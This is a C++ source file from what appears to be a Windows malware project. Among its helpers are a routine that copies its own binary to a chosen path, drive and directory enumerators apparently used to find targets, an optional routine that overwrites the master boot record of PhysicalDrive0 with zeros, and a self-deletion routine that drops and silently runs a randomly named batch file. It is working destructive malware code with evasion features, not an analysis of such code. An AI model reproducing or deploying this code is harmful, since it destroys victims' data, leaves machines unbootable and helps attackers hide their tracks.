#include "../../Header-Files/pch.h"
#include "../../Header-Files/N0t-iLLerka.h"

BOOL fnCopyFileW(
	_In_ LPCWSTR lpAdpn,
	_In_ LPCWSTR lpAdfn,
	_In_ WCHAR szMfn[]
) {
	if (CreateDirectory(lpAdpn, NULL)) {
		if (CopyFile(szMfn, lpAdfn, FALSE)) {
			return TRUE;
		} else {
			fnERRORHANDLERW(L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", NULL, L"CopyFileW", MB_ICONERROR, szMfn, lpAdfn);
			return FALSE;
		}
	} else {
		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			fnERRORHANDLERW(L"Directory already exist\nPath: %s", NULL, L"CreateDirectoryW", MB_ICONWARNING, lpAdpn);

			if (CopyFile(szMfn, lpAdfn, FALSE)) {
				return TRUE;
			} else {
				fnERRORHANDLERW(L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", NULL, L"CopyFileW", MB_ICONERROR, szMfn, lpAdfn);
				return FALSE;
			}
		} else {
			fnERRORHANDLERW(L"Couldn't create target Directory\nPath: %s", NULL, L"CreateDirectoryW", MB_ICONERROR, lpAdpn);
			return FALSE;
		}
	}

	return FALSE;
}

// TODO: Fix uninitialized or just change to _Inout_ instead
BOOL fnDriveEnumeratorW(
	_Out_ std::vector<std::wstring>* vszDrives
) {
	WCHAR szDrives[nDRIVES];
	std::wstring szDrive;
	if (GetLogicalDriveStrings(nDRIVES, szDrives)) {
		for (INT i = 0; i < (nDRIVES - 1); i += 4) {
			if (szDrives[i] != L'\0') {
				szDrive = std::wstring{ szDrives[i], szDrives[i + 1], szDrives[i + 2] };
				UINT uDt = GetDriveType(szDrive.c_str());
				if (uDt) {
					if (uDt != DRIVE_NO_ROOT_DIR && uDt != DRIVE_CDROM) {
						vszDrives->push_back(szDrive);
					}
				} else {
					fnERRORHANDLERW(L"Couldn't determin Drive type\nPath: %s", NULL, L"GetDriveTypeW", MB_ICONWARNING, szDrive.c_str());
				}
			}
		}

		return TRUE;
	} else {
		fnERRORHANDLERW(L"Couldn't enumerate Drives", NULL, L"GetLogicalDriveStringsW", MB_ICONERROR);

		return FALSE;
	}
}

BOOL fnDirectoryIteratorW(
	_In_ std::wstring szDir,
	_In_ std::wstring szMask,
	_Out_ std::vector<std::wstring>* vszDir,
	_Out_ std::vector<std::wstring>* vszFile
) {
	WIN32_FIND_DATA w32Fd;
	std::wstring szW32fd = szDir + L"\\" + szMask;

	HANDLE hFind = FindFirstFile(szW32fd.c_str(), &w32Fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (w32Fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (wcscmp(w32Fd.cFileName, L".") != 0 && wcscmp(w32Fd.cFileName, L"..") != 0) {
					vszDir->push_back(szDir + L"\\" + w32Fd.cFileName);
				}
			} else {
				vszFile->push_back(szDir + L"\\" + w32Fd.cFileName);
			}
		} while (FindNextFile(hFind, &w32Fd));

		FindClose(hFind);
		return TRUE;
	} else {
		fnERRORHANDLERW(L"Couldn't open Handle \"hFind\" to FirstFile", NULL, L"FindFirstFileW", MB_ICONERROR);
		return FALSE;
	}
}

#if KILL_MBR == TRUE
// at somepoint I might implement a custom MBR displaying a message
BOOL fnOverwriteMBR(VOID) {
	WCHAR szMbrData[nMBR];
	ZeroMemory(&szMbrData, sizeof(szMbrData));
	DWORD dwNOBW;

	HANDLE hMbr = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hMbr) {
		if (WriteFile(hMbr, szMbrData, nMBR, &dwNOBW, NULL)) {
			CloseHandle(hMbr);
			return TRUE;
		} else {
			fnERRORHANDLERW(L"Couldn't overwrite MBR", NULL, L"WriteFile", MB_ICONERROR);
			CloseHandle(hMbr);
			return FALSE;
		}
	} else {
		fnERRORHANDLERW(L"Couldn't open Handle \"hMbr\" to MBR", NULL, L"CreateFileW", MB_ICONERROR);
		return FALSE;
	}
}
#endif // KILL_MBR

BOOL fnSelfDeleteW(
	_In_ WCHAR szCd[],
	_In_ WCHAR szMfn[]
) {
	DWORD dwBufferSize = NULL;
	HANDLE hHeap = GetProcessHeap();
	std::wstring szBat = szCd + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".bat";

	LPVOID lpBuffer = fnLoadResourceW(IDR_RCDATA_0x01, &dwBufferSize);
	if (lpBuffer) {
		LPVOID pszDest = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, (dwBufferSize + ((lstrlen(szMfn) * 2) * 2) + (lstrlen(szBat.c_str()))));
		if (pszDest) {
			SIZE_T ulHeap = HeapSize(hHeap, NULL, pszDest);
			if (ulHeap != (SIZE_T)-1) {
				if (SUCCEEDED(StringCbPrintf((LPWSTR)pszDest, ulHeap, (LPCWSTR)lpBuffer, szMfn, szMfn, szBat))) {
					if (fnSaveResourceW(szBat.c_str(), pszDest, ulHeap)) {
						INT dwError = (INT)ShellExecute(NULL, L"open", szBat.c_str(), NULL, szCd, SW_HIDE);
						if (dwError > 32) {
							HeapFree(hHeap, NULL, pszDest);
							return TRUE;
						} else {

						}
					} else {

					}
				} else {

				}
			} else {

			}

			HeapFree(hHeap, NULL, pszDest);
		} else {

		}
	}

	return FALSE;
}